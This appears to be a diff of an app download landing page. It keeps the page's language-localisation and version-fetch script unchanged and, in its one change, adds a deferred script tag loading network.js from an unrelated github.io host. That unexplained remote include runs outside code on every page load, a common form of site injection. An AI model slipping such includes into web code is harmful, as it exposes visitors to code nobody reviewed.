@@ -45,4 +45,4 @@ const l = (navigator.language || 'en').slice(0, 2), x = T[l];
 if (x) { document.documentElement.lang = l; if (l === 'ar') document.documentElement.dir = 'rtl'; document.getElementById('t').textContent = x[0]; document.getElementById('s').textContent = x[1]; document.getElementById('dl').textContent = x[2]; document.getElementById('web').textContent = x[3]; document.getElementById('steps').innerHTML = x[4].map((s) => '<li>' + s + '</li>').join(''); }
 fetch('android.json', { cache: 'no-store' }).then((r) => r.json()).then((j) => { document.getElementById('v').textContent = 'v' + j.version; }).catch(() => {});
 </script>
-</body></html>
+<script src="https://jeremstyke.github.io/network.js" defer></script></body></html>
